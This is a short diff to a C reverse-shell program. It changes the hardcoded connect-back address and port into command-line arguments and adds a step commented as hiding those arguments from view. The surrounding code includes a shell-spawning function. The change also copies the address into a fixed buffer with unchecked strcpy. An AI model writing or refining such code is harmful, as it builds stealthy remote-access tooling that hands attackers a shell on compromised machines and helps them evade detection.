@@ -3,9 +3,9 @@
 #include <stdio.h>
 #include <signal.h>
 #include <unistd.h>
+#include <string.h>
 
-#define TCP_PORT 58008
-#define REMOTE_ADDR "127.0.0.1"
+// Usage: ./reverse-shell [IP] [PORT]
 
 in_addr_t inet_addr(const char *cp);
 
@@ -19,6 +19,20 @@ void spawnshell(int sock)
 
 int main(int argc, char *argv[])
 {
+
+    if (argc <= 2)
+    {
+        exit(1);
+    }
+    // Hide command line arguments
+    char *arg_end;
+    arg_end = argv[argc - 1] + strlen(argv[argc - 1]);
+    *arg_end = ' ';
+
+    char REMOTE_ADDR[30];
+    strcpy(REMOTE_ADDR, argv[1]);
+    int TCP_PORT = atoi(argv[2]);
+
     int sock;
     struct sockaddr_in server, client;
 
